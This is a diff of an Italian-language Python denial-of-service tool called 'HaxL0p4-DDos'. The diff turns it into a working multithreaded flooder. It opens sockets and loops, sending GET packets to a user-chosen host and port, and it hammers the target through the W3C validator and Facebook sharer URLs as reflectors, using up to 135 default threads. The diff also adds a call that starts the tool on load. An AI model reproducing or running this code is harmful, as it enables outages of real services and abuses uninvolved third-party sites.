@@ -123,10 +123,12 @@ def animazione_lettere(testo, ms):
 
 
 
+from queue import Queue
+import time, sys, socket, threading, logging, urllib.request, random
+
 def HaxL0p4_Ddos():
     os.system("clear && figlet HaxL0p4-DDos")
     animazione_lettere(f"{Fore.RED}\n [😼] HaxL0p4-DDos by L0PA on Github{Style.RESET_ALL}: {Fore.CYAN}https://github.com/L0PA{Style.RESET_ALL}\n", 0.03)
-
     def user_agent():
         global uagent
         uagent=[]
@@ -139,17 +141,23 @@ def HaxL0p4_Ddos():
         uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
         return(uagent)
 
-    def my_bots_from_file(filename):
-        with open(filename, 'r') as file:
-            bots = [line.strip() for line in file.readlines()]
-        return bots
-
     def my_bots():
         global bots
-        bots = my_bots_from_file('zombies.txt')
-        return bots
+        bots=[]
+        bots.append("http://validator.w3.org/check?uri=")
+        bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+        return(bots)
 
-    def down_it():
+    def bot_hammering(url):
+        try:
+            while True:
+                req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+                print("\033[94mHaxL0p4-DDos is Attacking...\033[0m")
+                time.sleep(.1)
+        except:
+            time.sleep(.1)
+
+    def down_it(item):
         try:
             while True:
                 packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
@@ -157,23 +165,26 @@ def HaxL0p4_Ddos():
                 s.connect((host,int(port)))
                 if s.sendto( packet, (host, int(port)) ):
                     s.shutdown(1)
-                    print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--HaxL0p4-DDos attacking!--> \033[0m")
+                    print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--HaxL0p4 packet sent!--> \033[0m")
                 else:
                     s.shutdown(1)
                     print("\033[91mshut<->down\033[0m")
                 time.sleep(.1)
         except socket.error as e:
-            print("\033[91m no connection! server maybe down\033[0m")
+            print("\033[91mno connection! server maybe down\033[0m")
             time.sleep(.1)
 
-    def bot_hammering():
-        try:
-            while True:
-                req = urllib.request.urlopen(urllib.request.Request(random.choice(my_bots())+"http://"+host,headers={'User-Agent': random.choice(uagent)}))
-                print("\033[94m HaxL0p4 is attacking...\033[0m")
-                time.sleep(.1)
-        except:
-            time.sleep(.1)
+    def dos():
+        while True:
+            item = q.get()
+            down_it(item)
+            q.task_done()
+
+    def dos2():
+        while True:
+            item=w.get()
+            bot_hammering(random.choice(bots)+"http://"+host)
+            w.task_done()
 
     # Aggiunta della funzione per richiedere l'input dall'utente
     def get_user_input():
@@ -185,8 +196,8 @@ def HaxL0p4_Ddos():
         port = input(f" Inserisci il numero della porta (default 80) {Fore.CYAN}>{Style.RESET_ALL}  ") or 80
         thr = input(f" Inserisci il valore turbo (default 135) {Fore.CYAN}>{Style.RESET_ALL} ") or 135
 
-        print(f"\n\033[92m {host} porta: {str(port)} turbo: {str(thr)}\033[0m")
-        print("\033[94m Attendi...\033[0m")
+        print(f"\033[92m{host} porta: {str(port)} turbo: {str(thr)}\033[0m")
+        print("\033[94mAttendi...\033[0m")
 
     # Inizializzazione delle code
     q = Queue()
@@ -214,10 +225,10 @@ def HaxL0p4_Ddos():
 
     # Creazione e avvio dei thread
     for i in range(int(thr)):
-        t = threading.Thread(target=down_it)
+        t = threading.Thread(target=dos)
         t.daemon = True
         t.start()
-        t2 = threading.Thread(target=bot_hammering)
+        t2 = threading.Thread(target=dos2)
         t2.daemon = True
         t2.start()
 
@@ -233,6 +244,9 @@ def HaxL0p4_Ddos():
 
     q.join()
     w.join()
+
+# Chiamata alla funzione HaxL0p4_Ddos()
+HaxL0p4_Ddos()
 
 
 
